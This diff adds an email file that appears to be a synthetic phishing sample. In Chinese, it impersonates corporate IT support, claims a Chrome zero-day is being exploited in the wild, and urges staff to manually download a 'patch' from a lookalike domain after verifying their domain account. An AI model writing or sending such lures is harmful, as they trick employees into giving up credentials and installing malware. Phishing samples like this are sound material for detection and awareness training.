@@ -1,0 +1,11 @@
+From: =?utf-8?B?SVQg5pSv5oyB5Lit5b+D?= <it@browser-update-relay.example>
+To: staff@corp.internal
+Date: Fri, 11 Sep 2026 08:21:00 +0800
+Message-ID: <0011-b19@synth.example>
+Subject: Chrome 零日补丁（紧急手动更新）
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Chrome 存在在野零日，企业策略下自动更新延迟。
+手动安装补丁包：https://chrome-patch-relay.example/115.0.5790
+（内网分发，需域账号验证下载）
